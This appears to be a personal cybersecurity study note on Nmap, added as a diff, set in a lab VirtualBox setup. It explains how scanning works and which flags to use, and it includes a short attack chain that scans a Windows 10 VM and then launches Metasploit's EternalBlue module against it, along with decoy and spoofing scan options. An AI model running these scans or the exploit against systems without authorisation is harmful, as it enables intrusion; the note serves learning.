@@ -1,0 +1,280 @@
+# Day 1: Nmap — The Network Mapper
+
+> **Category:** Information Gathering
+> **Difficulty:** ⭐⭐ Intermediate
+> **Time Spent:** 4 hours
+
+---
+
+## 📖 1. Origin Story
+
+**Who Made It:** Gordon Lyon (Fyodor) in 1997
+**Why It Exists:** Before Nmap, network scanning required manual packet crafting or expensive commercial tools.
+**What Came Before:** `ping`, custom C programs, ISS Internet Scanner.
+**Why Nmap Won:** Open source, fast, extensible (NSE), cross-platform.
+
+---
+
+## 📖 2. Etymology
+
+**Nmap** = **N**etwork **Map**per
+- **Network** — The interconnected system of hosts
+- **Map** — To chart, discover, and document
+
+---
+
+## 📖 3. Architecture
+
+| Component | Description |
+|-----------|-------------|
+| Language | C, C++, Lua (NSE) |
+| Dependencies | libpcap, OpenSSL, Lua |
+| Platforms | Linux, Windows, macOS, BSD |
+| License | GPLv2 |
+| Current Version | 7.99SVN |
+
+---
+
+## 📖 4. Mechanism
+
+### Step 1: Host Discovery
+
+1. Nmap sends ARP request (local) or ICMP echo (remote)
+2. If host responds, it's marked as "up"
+3. If no response, Nmap may send TCP SYN to port 80 or 443
+
+### Step 2: Port Scanning
+
+1. Nmap sends TCP SYN packet to each port
+2. SYN-ACK → port is OPEN
+3. RST → port is CLOSED
+4. No response → port is FILTERED
+
+### Step 3: Service Detection
+
+1. Nmap connects to open port
+2. Sends probes (HTTP GET, SSH banner, etc.)
+3. Compares response to signature database
+4. Identifies service and version
+
+---
+
+## 📖 5. System-Level Trace
+User runs: nmap -sS 192.168.56.106
+↓
+Shell parses arguments
+↓
+Nmap binary loaded
+↓
+Nmap opens raw socket (CAP_NET_RAW capability)
+↓
+Nmap builds TCP SYN packet
+↓
+Kernel IP layer adds IP header
+↓
+Kernel ARP resolves MAC address
+↓
+Network driver sends Ethernet frame
+↓
+VirtualBox virtual NIC
+↓
+Host machine network stack
+↓
+Windows 10 virtual NIC
+↓
+Windows kernel receives frame
+↓
+TCP layer processes SYN
+↓
+If port open: sends SYN-ACK
+↓
+Reply travels back through all layers
+↓
+Nmap receives SYN-ACK
+↓
+Nmap sends RST (doesn't complete handshake)
+↓
+Nmap displays: "445/tcp open"
+
+
+
+---
+
+## 📖 6. Command Dissection
+
+### Basic Scan
+```bash
+nmap 192.168.56.106
+SYN Scan (Stealth)
+bash
+sudo nmap -sS 192.168.56.106
+Service Version Detection
+bash
+sudo nmap -sV 192.168.56.106
+OS Detection
+bash
+sudo nmap -O 192.168.56.106
+Full Port Scan
+bash
+sudo nmap -sS -p- -T4 -n 192.168.56.106
+Vulnerability Scan
+bash
+sudo nmap --script vuln -n 192.168.56.106
+📖 7. Why This? Why Not That?
+Alternative	Why Nmap Chose This	Trade-off
+TCP Connect Scan	SYN scan is stealthier	Requires root
+UDP Scan	TCP is more common	UDP is slower
+ICMP Ping	ARP is more reliable on LAN	Only works on local network
+Masscan	Nmap is more feature-rich	Masscan is faster
+📖 8. Real-World Attack Chain
+Scenario: Windows 10 target (192.168.56.106)
+
+Step 1: Discover Host
+bash
+sudo nmap -sn 192.168.56.0/24
+Step 2: Scan Ports
+bash
+sudo nmap -sS -sV -p- -T4 -n 192.168.56.106
+Step 3: Identify Services
+Port 135: RPC
+
+Port 139: NetBIOS
+
+Port 445: SMB
+
+Step 4: Check for Vulnerabilities
+bash
+sudo nmap -p 445 --script smb-vuln-ms17-010 -n 192.168.56.106
+Step 5: Exploit
+bash
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.56.106
+set LHOST 192.168.56.100
+run
+📖 9. Failure Modes
+Failure	Cause	Fix
+massdns.cc: Assertion failed	DNS resolver bug	Add -n flag
+Couldn't open raw socket	Not root	Use sudo
+Host seems down	Firewall blocking	Use -Pn
+Slow scan	High latency	Use -T4
+No ports open	Firewall	Disable firewall
+
+---
+
+📖 10. Security Lens
+
+
+ASSET: Network services
+TRUST BOUNDARY: Firewall, IDS/IPS
+ASSUMPTION: Open ports mean reachable services
+ATTACK SURFACE: Every open port
+VULNERABILITY: Unpatched services, misconfigurations
+EXPLOIT CONDITION: Known CVE + reachable port
+IMPACT: Depends on service (RCE, data theft)
+DETECTION: IDS signatures, logs
+MITIGATION: Firewall, patching, segmentation
+RESIDUAL RISK: Zero-day exploits
+📖 11. Edge Cases
+Edge Case	What Happens
+Port 0	Invalid, usually ignored
+Port 65536	Invalid, out of range
+Fragmented packets	Nmap can fragment with -f
+Decoy scan	-D sends from fake IPs
+Spoofed source	-S spoofs source IP
+Idle scan	-sI uses zombie host
+📖 12. Source Code Forensics
+Nmap's Source Code Structure:
+
+---
+
+nmap/
+├── scan_engine.cc       # Port scanning logic
+├── osscan2.cc           # OS detection
+├── service_scan.cc      # Service detection
+├── target.cc            # Target management
+├── nse_main.cc          # NSE engine
+├── nse_script.cc        # NSE script execution
+└── output.cc            # Output formatting
+Key Function: ultra_scan()
+
+Located in scan_engine.cc
+
+Handles the core scanning loop
+
+Uses select() or poll() for async I/O
+
+---
+
+📖 13. Experimental Verification
+Test 1: Verify Nmap Uses Raw Sockets
+bash
+sudo strace -e trace=socket nmap -sS 192.168.56.106
+Test 2: Capture Nmap Traffic
+bash
+sudo tcpdump -i eth0 host 192.168.56.106 -w nmap.pcap
+# In another terminal:
+sudo nmap -sS 192.168.56.106
+# Analyze in Wireshark
+Test 3: Compare SYN vs Connect Scan
+bash
+# SYN scan (root)
+sudo nmap -sS 192.168.56.106
+
+---
+
+# Connect scan (non-root)
+nmap -sT 192.168.56.106
+📖 14. Rabbit Holes
+TCP/IP Stack — TTL, TCP flags, window size, options
+
+NSE Scripting — Lua programming, Nmap API
+
+OS Fingerprinting — TCP/IP stack differences, TTL patterns
+
+Packet Crafting — Scapy, Hping3, raw sockets
+
+---
+
+📖 15. Nerd Check
+What TCP flag does Nmap send to initiate a SYN scan?
+
+What does a RST response indicate?
+
+Why does Nmap need root for SYN scan?
+
+What is the difference between -sS and -sT?
+
+How does Nmap detect OS without logging in?
+
+What does -Pn do?
+
+Why does Nmap crash with DNS resolver bug?
+
+What is the NSE engine written in?
+
+How does Nmap handle fragmented packets?
+
+What is an idle scan and why is it stealthy?
+
+---
+
+🎯 Key Takeaways
+      Nmap is the foundation of network reconnaissance
+
+      SYN scan is stealthy but needs root
+
+      Service detection is critical for finding exploits
+
+      The -n flag fixes the DNS resolver bug
+
+      NSE scripts automate vulnerability detection
+
+---
+
+🔗 References
+     Nmap Official Documentation
+
+     Nmap NSE Scripts
+
+     RFC 793 - TCP
